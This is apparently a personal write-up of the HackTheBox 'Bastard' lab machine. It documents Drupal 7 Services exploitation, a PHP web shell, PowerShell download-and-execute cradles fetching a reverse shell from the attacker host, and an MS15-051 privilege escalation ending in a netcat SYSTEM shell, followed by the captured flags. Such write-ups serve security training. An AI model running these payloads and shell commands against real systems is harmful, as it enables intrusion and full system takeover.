---
Category:
  - B2R
Difficulty: Medium
Platform: HackTheBox
Status: 3. Complete
tags: [Drupal, MS15-051, RCE, Windows]
---
# Resolution summary

>[!summary]
>- Web server is running a vulnerable version of **Drupal**, which can be exploited though different **Remote Code Execution** exploits.
>- Privilege escalation can be achieved abusing **SeImpersonatePrivilege** privileges or through the **MS15-051** exploit

## Improved skills

- Exploit Drupal fixing and using known exploits
- Escalate privileges trough Windows kernel exploits or abusing the SeImpersonatePrivilege

## Used tools

- nmap
- public exploits

---

# Information Gathering

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Bastard]
└─$ sudo nmap -sV -sC -sT -p80,135,49154 -oN scans/open-ports.txt  10.10.10.9
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 04:29 EDT
Nmap scan report for 10.10.10.9
Host is up (0.065s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.77 seconds
```

# Enumeration

## Port 80 - HTTP

Microsoft-IIS/7.5 - Drupal 7.54 - PHP 5.3.28

![Pasted image 20210422102600.png](../../zzz_res/attachments/Pasted_image_20210422102600.png)

![Pasted image 20210422105325.png](../../zzz_res/attachments/Pasted_image_20210422105325.png)

**Robots.txt**

```
Allow: /misc/*.css?
Allow: /misc/*.css$
Allow: /misc/*.gif
Allow: /misc/*.jpeg
Allow: /misc/*.jpg
Allow: /misc/*.js?
Allow: /misc/*.js$
Allow: /misc/*.png
Allow: /modules/*.css?
Allow: /modules/*.css$
Allow: /modules/*.gif
Allow: /modules/*.jpeg
Allow: /modules/*.jpg
Allow: /modules/*.js?
Allow: /modules/*.js$
Allow: /modules/*.png
Allow: /profiles/*.css?
Allow: /profiles/*.css$
Allow: /profiles/*.gif
Allow: /profiles/*.jpeg
Allow: /profiles/*.jpg
Allow: /profiles/*.js?
Allow: /profiles/*.js$
Allow: /profiles/*.png
Allow: /themes/*.css?
Allow: /themes/*.css$
Allow: /themes/*.gif
Allow: /themes/*.jpeg
Allow: /themes/*.jpg
Allow: /themes/*.js?
Allow: /themes/*.js$
Allow: /themes/*.png
Disallow: /admin/
Disallow: /CHANGELOG.txt
Disallow: /comment/reply/
Disallow: /cron.php
Disallow: /filter/tips/
Disallow: /includes/
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /install.php
Disallow: /INSTALL.sqlite.txt
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /misc/
Disallow: /modules/
Disallow: /node/add/
Disallow: /profiles/
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /scripts/
Disallow: /search/
Disallow: /themes/
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /user/login/
Disallow: /user/logout/
Disallow: /user/password/
Disallow: /user/register/
Disallow: /xmlrpc.php
```

# Exploitation

## Drupal 7.x Module Services - Remote Code Execution

Exploit: [Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/41564)

Exploit edits:

```php
...
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'ws.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
];
...
...
```

Exploit execution:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Bastard/exploit]
└─$ php 41564.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce

#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/ws.php
```

RCE achieved:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Bastard/exploit]
└─$ curl http://10.10.10.9/ws.php?cmd=whoami
nt authority\iusr
```

Reverse shell: [nishang/Invoke-PowerShellTcp.ps1 at master · samratashok/nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Edit the reverse shell and host it:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Bastard/exploit]
└─$ echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 4444' >> revshell.ps1

┌──(kali㉿kali)-[~/…/HTB/box/Bastard/exploit]
└─$ sudo python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.9 - - [22/Apr/2021 06:20:09] "GET /revshell.ps1 HTTP/1.1" 200 -
```

Download and execute the reverse shell:

```bash
http://10.10.10.9/ws.php?cmd=powershell.exe IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.14/revshell.ps1')
```

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Bastard/exploit]
└─$ nc -nlvp 4444            
listening on [any] 4444 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.9] 64362
Windows PowerShell running as user BASTARD$ on BASTARD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\drupal-7.54>whoami
nt authority\iusr
```

# Privilege Escalation

## Local enumeration

User info:

```powershell
PS C:\Users\dimitris\desktop> whoami
nt authority\iusr
PS C:\Users\dimitris\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

PS C:\Users\dimitris\desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Group used for deny only                          
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
PS C:\Users\dimitris\desktop> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            dimitris                 Guest                    
The command completed with one or more errors.
```

System info:

```powershell
PS C:\Users\dimitris\desktop> systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 ??
System Boot Time:          21/4/2021, 6:09:00 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.483 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.494 MB
Virtual Memory: In Use:    601 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
```

Possible Kernel Exploit:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/Bastard/exploit]
└─$ /opt/post-expl/windows/Windows-Exploit-Suggester/windows-exploit-suggester.py -i systeminfo -d /opt/post-expl/windows/Windows-Exploit-Suggester/2021-04-22-mssb.xls
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

Netstat info:

```powershell
C:\inetpub\drupal-7.54>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:81             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       672
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1064
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       372
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       760
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       796
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       484
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       492
  TCP    10.10.10.9:80          10.10.14.14:46640      CLOSE_WAIT      4
  TCP    10.10.10.9:80          10.10.14.14:46642      ESTABLISHED     4
  TCP    10.10.10.9:139         0.0.0.0:0              LISTENING       4
  TCP    10.10.10.9:49552       10.10.14.14:4444       ESTABLISHED     2068
  TCP    10.10.10.9:49555       10.10.14.14:4444       ESTABLISHED     2652
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:81                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       672
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       372
  TCP    [::]:49153             [::]:0                 LISTENING       760
  TCP    [::]:49154             [::]:0                 LISTENING       796
  TCP    [::]:49155             [::]:0                 LISTENING       484
  TCP    [::]:49156             [::]:0                 LISTENING       492
  UDP    0.0.0.0:123            *:*                                    844
  UDP    0.0.0.0:5355           *:*                                    932
  UDP    10.10.10.9:137         *:*                                    4
  UDP    10.10.10.9:138         *:*                                    4
  UDP    [::]:123               *:*                                    844
```

Sherlock enumeration:

```powershell
C:\inetpub\drupal-7.54>echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14/sh.ps1') | powershell -nop -
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.14/sh.ps1') | powershell -nop -
...
Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable
...
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
...
```

## MS15-051 privilege escalation

Exploit: [MS15-015](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip)

```powershell
┌──(kali㉿kali)-[~/…/HTB/box/Bastard/exploit]
└─$ sudo nc -nlvp 443                                                                        
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.9] 49572
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>copy \\10.10.14.14\kali\ms15-051x64.exe .
copy \\10.10.14.14\kali\ms15-051x64.exe .
        1 file(s) copied.

C:\inetpub\drupal-7.54>.\ms15-051x64.exe whoami
.\ms15-051x64.exe whoami
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 2932 created.
==============================
nt authority\system

C:\inetpub\drupal-7.54>.\ms15-051x64.exe "nc.exe 10.10.14.14 4444 -e cmd.exe"
.\ms15-051x64.exe "nc.exe 10.10.14.14 4444 -e cmd.exe"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 3052 created.
=============================
```

```powershell
┌──(kali㉿kali)-[~/CTFs/HTB/box/Bastard]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.9] 49574
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Administrator\Desktop>whoami && hostname && type root.txt.txt && ipconfig /all
whoami && hostname && type root.txt.txt && ipconfig /all
nt authority\system
Bastard
4bf12b963da1b30cc93496f617f7ba7c
Windows IP Configuration

   Host Name . . . . . . . . . . . . : Bastard
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-6E-44
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.9(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.{56FEC108-3F71-4327-BF45-2B4EE355CD0F}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

![Pasted image 20210422152557.png](../../zzz_res/attachments/Pasted_image_20210422152557.png)

# Trophy

>[!quote]
>I was addicted to Hacking, more for the intellectual challenge, the curiosity, the seduction of adventure; not for stealing, or causing a damage or writing computer viruses.
>
>\- Kevin Mitnick
 
>[!success]
>**User.txt**
>ba22fde1932d06eb76a163d312f921a2

>[!success]
>**Root.txt**
>4bf12b963da1b30cc93496f617f7ba7c

